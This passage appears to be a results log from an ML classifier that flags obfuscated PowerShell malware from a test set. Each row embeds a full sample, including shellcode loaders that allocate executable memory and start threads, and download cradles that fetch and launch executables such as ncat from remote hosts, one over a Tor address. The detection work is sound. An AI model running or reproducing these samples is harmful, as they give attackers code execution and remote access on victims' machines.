',';MUYCOYVXPDMUY;MUYQLikWodWTMUY;};MUYnlHScKMU','MUYLXUnfqnMUY;jpdErrorActionPreferenc','Shell.Application;MUYxeSuMUY;MUYBEJbUMUY;MUYBtnJKUSmMUY;MUYHuGM','UYRlMUY;};MUYmwPVMUY;MUYXYSMUY;MUYbSRkMMUY;MU','Wcpolipo.exeMUY;MUYHXKsRivfMUY;MUYoynNceOnFxyMUY;jpdbqvt=jpdezpr+MUYNWcMUY+jpdby','stemProduct).UUID;MUYkjEvisMrMUY;MUYBlwFKzHgxMUY;if ((gp HKCU:NWcNWcSoftwareNWcMicro','notice file jpdcvdzFZPle6le6 -wi Hidden;MUYPZxnCIMUY;MUYsoSyFSxzMUY;do{sleep 1;jpdbimy=gc jpdcvdz}whi','dby;MUYHTCMUY;MUYzgOwMUY','.Attributes = le6Hiddenle6, le6Systemle6, le6NotContentIndexedle6;MUYamPCGyMUY;','s = jpdxyu.NameSpace(jpdb','8.8.8le6) -match MUYle6MUY) -replace MUYle6MUY, MUYMUY)[0].Trim();MUYwHpWIPZMUY;MUYrZOmyTMUY;jpdilua.DownloadFile(jpdmtk, jpdbqvt);MUYKqrPYMUY;MUYt','ot -a le6socksParentPro','UYKcqLHXXNxQsMUY;MUYmBUkNfwsfiXMUY;jpdilua.proxy=jpdqdax;MUYNnVlUajchMUY;MUYtgizAGRCEXqMUY;jpdpbtx=MUYhttp://powerwormjqj42hu.onion/get.',' + MUYNWcMUY + jp','xpkMUY;MUYyYePwwMU',';MUYClMCvnGzMUY;};MUYkFqbERjcaKMUY;MUYcZdefvMUY;function e(jpdohd){;MUYdrSzUSrdMUY;MUYJvFdMU','znknftcRLMUY;(Get-Process -id jpdpid).Kill();MUYeMBnBWCMU')).rEplaCe(([ChAr]77+[ChAr]85+[ChAr]89),[StrinG][ChAr]39).rEplaCe(([ChAr]70+[ChAr]90+[ChAr]80),[StrinG][ChAr]96).rEplaCe('jpd','$').rEplaCe(([ChAr]108+[ChAr]101+[ChAr]54),[StrinG][ChAr]34).rEplaCe(([ChAr]78+[ChAr]87+[ChAr]99),[StrinG][ChAr]92))",malicious,TP
2026-07-13 16:47:51,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1614.ps1,custom-ps-ml,UNKNOWN,142e1c68-6127-4019-bdcc-775cf560ea2a,DESKTOP-BAC9DBQ,malicious,0.9998,RandomForest,471,1658.32," ((\""{32}{30}{10}{18}{23}{1}{13}{3}{27}{31}{28}{20}{15}{5}{2}{11}{4}{22}{6}{25}{8}{0}{16}{19}{21}{17}{7}{26}{24}{12}{29}{9}{14}\"" -f'Dp','.WebClient).Downlo','bf','V','ee.com/','5g','e.','.','VDp,V','eble','je','r','tart-Process VD','adFile(','.exeVDp','.','f','le','ct Sys','lee','alv','b','noza/odee','tem.Net','S','exe','exeVDp);','D','ttp://matk','pfle','w-Ob','ph','(Ne')).repLaCE(([cHaR]86+[cHaR]68+[cHaR]112),[sTrinG][cHaR]39)|&amp; ( $sHelLId[1]+$ShELLID[13]+'X')",malicious,TP
2026-07-13 16:48:04,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1619.ps1,custom-ps-ml,UNKNOWN,40f2ac0d-aa48-4d69-be72-eaddb77b9ef9,DESKTOP-BAC9DBQ,malicious,0.9215,RandomForest,472,1855.91,"&amp;((vaRIabLe '*mDR*').nAME[3,11,2]-join'')( (((\""{12}{8}{30}{17}{1}{31}{11}{16}{25}{28}{18}{9}{5}{2}{26}{27}{20}{6}{10}{29}{0}{14}{24}{22}{15}{19}{3}{7}{13}{23}{4}{21}\"" -f 'e{1}','ebClient).Downlo','jYlX4{','T','{1','rk',':TEMP','EMP{2}wi','w-Obj','/6h','{2}wi','File({0}h','(Ne','ncat.e',');Sta','es','ttp://rg','ystem.Net.W','t','s ({1}{3}env:','}env','})','oc','xe','rt-Pr','ho.','0},{','1}{3','s','ncat.ex','ect S','ad'))  -f [chAR]39,[chAR]34,[chAR]92,[chAR]36) )",malicious,TP
2026-07-13 16:48:19,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1622.ps1,custom-ps-ml,UNKNOWN,131ada70-a381-419e-a8c7-1d3d4eee4d8f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3203,1973.64,"((\""{31}{26}{70}{14}{50}{53}{8}{68}{6}{48}{15}{65}{52}{66}{54}{51}{1}{5}{59}{11}{0}{32}{61}{42}{75}{63}{33}{73}{22}{39}{57}{16}{10}{34}{20}{35}{41}{55}{36}{3}{17}{19}{24}{62}{12}{21}{44}{72}{4}{30}{25}{58}{18}{47}{67}{27}{74}{43}{64}{2}{29}{38}{13}{9}{28}{45}{56}{71}{23}{7}{40}{60}{49}{37}{46}{69}\"" -f'0x2c,0x20,0xc1,0xcf,','0c,0x8b,0x','36,0x6a,0x40,0x68,0x00,0x10,0x00,0','7,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77','x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5','52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0',' uint flProtect);[DllImp','c3,0x29,0xc6,0x75,0xc7,0xc3,0xb','tionTyp','f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x2','3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x',',0x61,0x7c,0x02,','0xa8','0x02,0xd9,0xc8,0x5','tPtr VirtualAlloc(Int','la',',0x7d,0xf8,0x',',0x26,0x07,0xff,0xd5,0','xc0,0x74,0x','xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x','0x4b,0x8b,0x58,0x1c,0',',0x00,0x19,','0x0d,0x','e9,0x71,0xff,0xff,0xff,0x01,0x','5','x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x7',' static extern I',',0x75,0xec','2,0x58,0x68,0x00,0x40,0x00,0x00','x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0',',0','SFlc = NWX[DllImport(ZY4kernel32.dllZY4)]public','0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x',',0x34,0x8b,0x01,0xd6,0x31,0xff,0xac','58,0x24,0x01,0xd3,0x66,0x8b,0x0c,','x01,0xd3,0x8b,0x04,0x8b,0x0',',0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x7','.Le','x53,0x6a,0x00,0x56,0x53,0x57,0x68,','01,0xc7,0x38,0xe0,','b,0xf0,0xb5,0xa2,0x','1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0','x11,0x78','0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0','0x68,0x02,0x00,0x1f',',0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,','ngth};SFlx=SFlw::VirtualAlloc(0,0x1000,SFlg','0a,0xf','ort(ZY4kernel32.dllZY4)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationF','5;SFlg = 0x1000;if (SFlz.Length -gt 0x1000){SFlg = SFlz','Ptr lpAddress, uint dwSize, uint flA','x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x',']public static extern IntPtr memset(IntPtr dest, uint src, uint count);NWX;SFlw = Add-Type -memberDefinition SFlc ','lloca','[]]SFlz = 0xfc,0xe8,0x82,0x00,0','xe0,0x5f,0x5f,0x5a,0x8b','0xff,0xd5,0x5e,0x5e,0xff,0x0c,','0x75,0xf6,0x03','4,0x61,0xff,0xd5,0x85,0','xff,0xac,0x3c','56,0x6a,0x00,0x53,0xff,0xd','3c,0x8b,0x4c,0','4,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,','x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b','x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x','gs, IntPtr lpThreadId);[DllImport(ZY4msvcrt.dllZY4)','-Name ZY4Win32ZY4 -namespace Win32Functions -passthru;[Byte[]];[Byte','f,0x4e,0x08','e,',',0x40);for (SFli=0;SFli -le (SFlz.Length-1);SFli++) {SFlw::memset([IntPtr](SFlx.ToInt32()+SFli), SFlz[SFli], 1)};SFlw::CreateThread(0,0,SFlx,0,0,0);for (;;){Start-sleep 60};','n','0x24,0x',',0x90,0',',0xc1,0xcf,',',0xe8,0x61,0x00,',',0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0')).rEPlACE('SFl','$').rEPlACE(([chAr]90+[chAr]89+[chAr]52),[StRING][chAr]34).rEPlACE('NWX',[StRING][chAr]39)| &amp;( $VeRbosEPrEFERence.tostriNg()[1,3]+'X'-JOIn'')",malicious,TP
2026-07-13 16:48:25,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1666.ps1,custom-ps-ml,UNKNOWN,df5d24a9-88b7-4c08-a1f0-0e014aba15dd,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3036,1786.92," .( $EnV:coMsPec[4,24,25]-jOIN'') ( (((\""{34}{7}{1}{17}{18}{19}{61}{21}{59}{40}{70}{33}{65}{28}{43}{37}{29}{66}{56}{24}{32}{22}{63}{12}{10}{4}{69}{5}{25}{49}{48}{16}{64}{3}{26}{58}{55}{42}{51}{47}{27}{13}{52}{30}{57}{15}{14}{6}{53}{20}{50}{72}{41}{45}{60}{9}{0}{35}{31}{2}{11}{44}{54}{62}{36}{46}{68}{8}{23}{39}{71}{67}{38}\""-f '1e,0xfa,0x1d,0x0f,0xa5,0xa','ubli','3,0xe5,0x06,0x2f,0x16,0x06,0x7','a9,0xa0,0x75,0','xe1,0xeb,0x','ec,0x0f,0x7f,0xd4,0xcd,0xdf,0x72,0x15,0x0a,0x3d,0x7e,0x47,0xc3,0x4','0x72,0x51,0x9e,0x07,0x5a,0x95,0xca,0x57,0xf4,0x3c,0x73,0x3c,0x04,0x','lImport(xCRkernel32.dllxCR)]p',',0x40);for (bLsi=0;bLsi -le (bLsz.Length-1);bLsi++) {bLsw::memset([IntPtr](bLsx.ToInt32()+',',0x',',0','f,0x9c,0xb1,0x','18,0x83,0xc3,0xd2,0x80,0xf0,0x82,0x32,0xc6,0xfb,0x7a,0xc2,0xa7,0x72,0x9f,0xf3,0xe7',',0xd0,0xbc,0x04,0xba,0x37,0x35,','x03,0x65,0x18,0xff,0xd3,0xe1,0x2b,0x8c,0xe1,0xae,0x87,0x1a,0x49,0x26,0x0e,0xdc,0xae,0x1d,0xf6,',',0xfc,0','0xb6,0x81,0xf2,0x77,0x38,0x46,0x8f,0x31,0x22,0x8b,0xaa,0x88,0xd9,0x7f,0x40,0x0b,0x08,0x','c static exte','rn IntPtr VirtualAlloc(IntPtr lpAd','dress, uint','x93,0x54,0x6d,0x1','tatic extern IntPtr CreateThread(IntPtr lpThreadAttributes, ','4,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,','bLsi)','xd0,0xb8,0xd6,0x62,0x05,0x','9','x7f,0x58,0xb8,0x','8f,0x3b','ern IntPtr memset(IntPtr dest,','2xCR -na',',0xbd,0xd5,','41,0x47,0x7c,0x28,0x12,0x72,0x8','7e,0xd9,0x7','lags, IntPtr lpThreadId);[DllImpor','bLsc = 1UJ[Dl','d,0x4a,0xa7,0xa7,0x88,0xbc,0x68,0x57,0xff,0xb7,0xa1,0xcd,0x40,0xaf,0xcd,0x01,0x41,0x2f,0x98,0x4b,0x','irtu','e xCRWin3','p 60};',', ',',',',0x74,0x5f,0x94,0xe7,0xe0,0xc6,0xbd,0x7c,0x91,0x07,0x68,0xf9,0x91,0x8',',0x6',' uint src, uint count);1UJ;bLsw = Add-Type -memberDefinition bLsc -Nam','6e,0x7d,0xfb,','c','alA',',0x','0xa8,0x57,',',0x2d,0x78,0x60,0x07,0xee,0xf3,0x3a,0x89,0x76,0xe7,0x8a,','9,0x54,0x05,0xcd,0xc9,0x3c,0x4f,0xc2,0x36,0x5c,0x70,0x09,0x5f,0xf7,0x8a,0xd9,0x49,0x26,0xa0,0xed,0xe2,0','e,0xc5,0x77,0x8e,0xa3,0x90,0xfc,0x9c,0x08,0xd6,0x5b,0x80','0x5e,0x99,0x93,0x1e,0x04,0x80,0x82,0xfa,0xeb','c1,0xa6,0','0xf6,0x30,0x7e,0x2e,0x07,0x0c,0xa9,0x16,0x7d,0x7c,0x69;bLsg = 0x1000;if (bLsz.Length -gt ','xca,0xb4,0x3e,0xc8,0x08,0xc7,0xe4,0x5d,0x8b,0x6f',']bLsz = 0xda,0','0xa5,0x54,0x18,0x9d,0x4b,0x80,0x11','b2,0x47,0x83,0xcf,0','uint dwStackSize',',0x9f,0xfd,0x5f,0x65,0xd5,0xed,0x37,0x85,0xa0,0x4c,0x91,0x9a',' dwSize, uint flAllocationType, uint flProtect);[DllImport(xCRkernel32.dllxCR)]public s','0x1000){bLsg = bLsz.Length};bLsx=bLsw::V','0x43,0x18,0x03,0x43,0x','4e,0x','t(xCRmsvcrt.dllxCR)]public static ext','mespace Win32Functions -passthru;[Byte[]];[Byte[]','Lsi], 1)};bLsw::CreateThread(0,0,bLsx,0,0,0);for (;;){Start-slee','lloc(0,0x1000,bLsg','a3,0xd7,0x62,0xb9,0x4f,0x93,0x27,0x2a,0xc4,0xd1,0xef,0x5d,0x6d,0x5f,0xd6,0x50,0x6e,0xcc,0x2a,0xf2,0x',' IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationF','bLsz[b','x34,0xca,0x1c,0xaf,0xb1,0x2c'))  -REPLAcE  ([chAr]98+[chAr]76+[chAr]115),[chAr]36 -REPLAcE  'xCR',[chAr]34 -REPLAcE  '1UJ',[chAr]39) )",malicious,TP
2026-07-13 16:48:39,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1671.ps1,custom-ps-ml,UNKNOWN,8b4d4dcb-da19-4117-93fc-911b6411a393,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2788,1984.48," &amp; ( $VerboSEprEFeREnCE.tOsTRING()[1,3]+'X'-joiN'') (((\""{15}{1}{4}{36}{25}{27}{12}{8}{43}{23}{14}{38}{28}{26}{13}{11}{2}{3}{41}{6}{40}{7}{10}{35}{44}{32}{37}{39}{5}{42}{21}{0}{46}{16}{17}{34}{18}{30}{33}{19}{31}{9}{29}{20}{45}{22}{24}\""-f',0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd','c static extern IntPtr VirtualAlloc','x8b,0x52,0x14,0x8b,0x72,0x2','8,0x0f,0xb7,0x4a,0x','(IntPtr lpAdd',',0x58,0x24,0x01,0xd3,',',0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,','0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe','wCre','1,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;8GEg = 0x1000;if (8GEz.','3,0x3c,0x49,0x','0x30,0x8b,0x52,0x0c,0','ibutes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint d','8GEz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,','rC)]','8GEc = ZQj[DllImport(8rCkernel32.dll8rC)]publi','51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,','0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x','68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x7',',0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5','1000){8GEg = 8GEz.Length};8GEx','0c,0x4b','for (8GEi=0;8GEi ','port(8rCmsvcrt.dll8','-le (8GEz.Length-1);8GEi++) {8GEw::memset([IntPtr](8GEx.ToInt32()+8GEi), 8GEz[8GEi], 1)};8GEw::CreateThread(0,0,8GEx,0,0,0);for (;;){Start-sleep 60};',';[DllImport(8rCkernel32.dll8rC)]public static extern IntPtr CreateThread(IntPtr lp','e[]];[Byte[]]','ThreadAttr','s -passthru;[Byt','Length -gt 0x','4,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f',',0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x0','01,0xc7,',',0xff,0xd5,0x8b,0x36,0x6a,0x40','c0,0xa8,0xb2,0x4a,0x','8b,0x34,0x8b,0x01,0xd6,0','ress, uint dwSize, uint flAllocationType, uint flProtect)','0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0','public static extern IntPtr memset(IntPtr dest, uint src, uint count);ZQj;8GEw = Add-Type -memberDefinition 8GEc -Name 8rCWin328rC -namespace Win32Function','x75,0xe2,0x58,0x8b','0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd','26,0x31,0xff,0x31,0xc0','0x66,0x8b,0x','ationFlags, IntPtr lpThreadId);[DllIm','x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x','=8GEw::VirtualAlloc(0,0x1000,8GEg,0x40);','0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x')).ReplaCE(([Char]56+[Char]71+[Char]69),'$').ReplaCE('8rC',[StrINg][Char]34).ReplaCE('ZQj',[StrINg][Char]39) )",malicious,TP
2026-07-13 16:48:45,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1672.ps1,custom-ps-ml,UNKNOWN,2d526b7a-822f-430d-b457-d36cac949e15,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2917,1677.52," (((\""{4}{6}{63}{39}{52}{68}{12}{44}{61}{7}{46}{11}{36}{15}{23}{25}{42}{27}{34}{41}{69}{10}{29}{49}{54}{38}{50}{16}{9}{47}{60}{22}{13}{57}{40}{3}{18}{37}{14}{66}{51}{20}{8}{35}{17}{65}{62}{5}{45}{26}{31}{21}{24}{59}{48}{58}{33}{1}{64}{55}{53}{43}{56}{67}{30}{32}{2}{19}{28}{0}\""-f'x,0,0,0);for (;;){Start-sleep 60};','5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0','ngth -gt 0x',',0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68','ZS','a,0x79,0x8','2c = vFG[DllImpo','Address, IntPtr lpParameter, uint dwCreatio','xd5,0x50,0x5','1,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0x','0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x','ags, IntPtr lpThreadId);[DllImport(Foymsvcrt.dllFoy)]public static extern IntPtr memset(IntPtr dest, uint src,',' uint flProtect);','1,0','5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,','ctions ','8b,0x58,0x20,0x0','50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x05,',',0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x','1000){ZS2g = ZS2z.Length};ZS2x=ZS2w::VirtualAlloc(0,0x1000,ZS2g,0x40);for (ZS2i=0;ZS2i -le (ZS2z.Length-1);ZS2i++) {ZS2w::memset([IntPtr](ZS2x.ToInt32()+ZS2i), ZS2z[ZS2i], 1)};ZS2w::CreateThread(0','0','x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0','8,0x1c,0x0','-passthru;[Byte[]];[Byte[]]ZS2z = 0xfc,','xec,0x68,0xf0,0xb5,0xa2,0x56','0xe8,0x89,0x00','00,0x01,0xbb,0x89,0xe6,0x6a,0x1','x0f,0xb7,0x4',',0,ZS2','57,0x8b,0x52,0x10,0x8b,0x42,0x3c',';ZS2g = 0x1000;if ','0,0x56,0x57,0x68,0','(ZS2z.Le','xff,0xd','a','0,0x',' uint count);vFG;ZS2w = Add-Type -memberDefinition ZS2c -Name FoyWin32Foy -namespace Win32Fun','4c,0x77,0x26,0x07,0xff,0xd','x78,0x85,0x','Ptr VirtualAlloc(I',',0xff,0xe0,0x58',',0x26,0x31,0',',0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0','xff,0x','[D','5,0x68,0x02,0x','nFl','f4,0x03,0x7d,0xf8,0','0x57,0',',0x01,0xd','c0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x','x50,0x68,0x29,0x80,0x6b,0x00,0xff,','n','xa4,0x53,0xe5,0','0,0x8b,0x40,0','8,0','d5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5','xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51','x68,0x02,0xd9,0xc8,0x5f,0',',0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,','x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x5','llImport(Foykernel32.dllFoy)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStart','c','rt(Foykernel32.dllFoy)]public static extern Int','x5','0x','0',',0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3','tPtr lpAddress, uint dwSize, uint flAllocationType,','xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,'))  -cReplace  ([ChAr]118+[ChAr]70+[ChAr]71),[ChAr]39  -replace  'Foy',[ChAr]34  -cReplace ([ChAr]90+[ChAr]83+[ChAr]50),[ChAr]36)|IeX",malicious,TP
2026-07-13 16:49:00,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1678.ps1,custom-ps-ml,UNKNOWN,e0d1107f-0fce-4ada-8438-9f102eb07025,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3098,1851.96," . ( $ENV:coMSPEc[4,26,25]-jOin'')(((\""{55}{68}{45}{53}{23}{57}{25}{11}{19}{24}{70}{66}{29}{30}{59}{54}{48}{52}{7}{5}{10}{26}{34}{46}{58}{21}{64}{56}{22}{51}{61}{38}{37}{40}{33}{49}{62}{60}{47}{43}{0}{50}{9}{4}{6}{15}{65}{16}{27}{13}{42}{3}{17}{32}{36}{28}{20}{14}{39}{69}{12}{8}{18}{2}{31}{44}{67}{71}{1}{41}{72}{63}{35}\""-f '27','Ptr](SJAktN.',' SJAz.Length};SJAktN=SJAw::Virtual','x86,0x2a,0x46,0xe5,0x33,0x2e,0xd0,0x9c,0xa5,0x0a,0x29,0xc9,0x27,0x6b,0x38,0x55,0xa1,0x8d,0x6a,0x35,0x','0xc3,0xbf,0x95,0x8e,0x20,0xf2,0x25,0x4e,0x2f,0x85,0x56,0x7c,0xf0,0x3d,0xf1,0x','b,0xc2,','cc,0x79,0x98,0x06,0x33,0','ctions -passthru;[Byte[]];[Byte[]]SJAz = 0xb8,0x46,0x20,0x9b,0xa4,0xd',',0x4b,0x9d,0x55,0xaa,0x6e,0xe2,0x43,0xde,0x23,0x77,0x6c,0xb7,0x90,0xd0,0x04,0x35,0xcf,0x17,0x8b,0xc6,0x3a,0xa6,0xf7,0x10,0x02,0xdc,0x19,0xa1;SJAg = 0x1000;if (','8d,0xb7,0xc6,','0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0','wStackSize, IntPtr lpStartA','39,0xed,0xf9','0x0f,0xcd,0xa','0x3b,0xe6,0xce,0x04,0xed,0xf9,0xe4,0','x50,0x5c,','98,0xca,0x5b,0x9d,0xb0,','e1,0x01,0','SJAz.Length -gt 0x1000){SJAg =','ddress, IntPtr lpParameter, uint dwC','85,0x66,0xf6,0xb0,0x85,0xed,0xf5,0x45,0x4b,0x06,0x73,0x56,','e,0x0c,0x3e,0','0xd8,0x77,0xc9,0xc4,0x3a,0x46,0x02,0x19,0x3a,0x8f,','tt','r',', uint d','xb1,0x47,0x31,0x42,0x13,0x83,0xc2,0x04,0','0x08,','0xb4,0x','rt(e2Omsvcrt.dlle2O)]public static ex','tern IntPtr me','Alloc(0,0x1000,SJAg,0x40);for (S','xca,0xe5,0x41,0xf2,0xa2,0xef,0x4d,0x2d','6b,0x5','x03,0x42,0x49,0xc2,0x','60};',',0xd2,0x0f,0x84,0x46,0x78,0xe0,0x71,0x3e,0x14,0x99,0xdb,','e4,0x1e,0x4e,0x5b,0xc2,0xc0,0x25,0x95,0x31,0x7c,0x3e,0x62,0x48,0x5a,0xcb,0x71,0xea,0x29,','0x31,0xcd,0x5e,0xc3,0x49,0x44,0x79,0x00,0x77,0x1e,0xf2,0xf2,0x03,0xa1,0xd2,0xcb,0xec,0x0e,0x1b,0x','x23,0x11,0x6c,0x03,0xe2,0x46,0x18,0x09,0xd3,0xa0,0x87,0xf2,0x36,0xbb,0x0e,0x67,0xf9,0x','0x','ToInt32()+SJAi), SJAz[SJAi], 1)};SJAw::CreateTh','a,0xb9,0x30,0','9c,0x76,0xfa,0x9b,0x47,0x16,0x5b,0x41,0x29,0x','JAi=0;SJAi -le (SJAz','nt flAllocationType, uint flProtect);[DllImport(e2Okernel32.dlle2O)]public static extern IntPtr CreateThread(In','6e,0x58,0xbd,0x80,0x91,0xa1,0x3d,0xe5,0x18,0x44,0x0c,0x25,0','9,0x37,0xc6,0x50,0xde,0xbe,0x','ame e2OWin32e2O -na','e,0x0',',0xbb,0x2a,0x96,0x','0x7f,0xd0,0x6e,0x58,0x0b,0x47,0x9f,0xed,0x41,0x54,0x14,0xbd,0x44,0xdc,0xc9,0x75,0','mespace Win32Fun','tPtr lpThreadA','t(IntPtr dest, uint src, uint count);nvk;SJAw = Add-Type -memberDefinition SJAL8Q -N','SJAL8Q = nvk[DllImport(e2Okernel32.dl','99,0xa3,0xb9,0xf3,0xb2,0x90,','ributes','x7','mse','x4d,0xad,0x0','x66,0xcd,0x5f,0x0e,','b,0xfd,0xea,0x15,0x07,0x4a,0x78,0x71,0x0b,0',';for (;;){Start-sleep ','x95,0xf4,0x40,0xb2,0x5e,0x58,0x71,0x41,0x12,0x75,0x76,0xe2,0x','0x','o','.Length-1);SJAi++) {SJAw::memset([In','le2O)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, ui','d3,0x6e,0x67,0xf9,0x23,0x','eationFlags, IntPtr lpThreadId);[DllImp','t','read(0,0,SJAktN,0,0,0)')).rEPlacE(([CHAr]101+[CHAr]50+[CHAr]79),[STrInG][CHAr]34).rEPlacE(([CHAr]83+[CHAr]74+[CHAr]65),'$').rEPlacE(([CHAr]110+[CHAr]118+[CHAr]107),[STrInG][CHAr]39))",malicious,TP
2026-07-13 16:49:16,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1681.ps1,custom-ps-ml,UNKNOWN,00ff5018-fc0b-486a-bd47-df1be1538333,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2793,1749.66,"((\""{33}{30}{3}{1}{18}{21}{19}{34}{32}{35}{28}{16}{14}{38}{42}{37}{6}{5}{20}{45}{24}{12}{25}{15}{36}{44}{11}{17}{26}{40}{31}{13}{8}{10}{9}{46}{27}{0}{4}{2}{23}{22}{29}{43}{39}{41}{7}\"" -f 'xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x6','int flAllocationType, ui','x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0','Size, u','8,0x02,0xd9,0xc8,0',',0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x3','8','hx,0,0,0);for (;;){Start-sleep 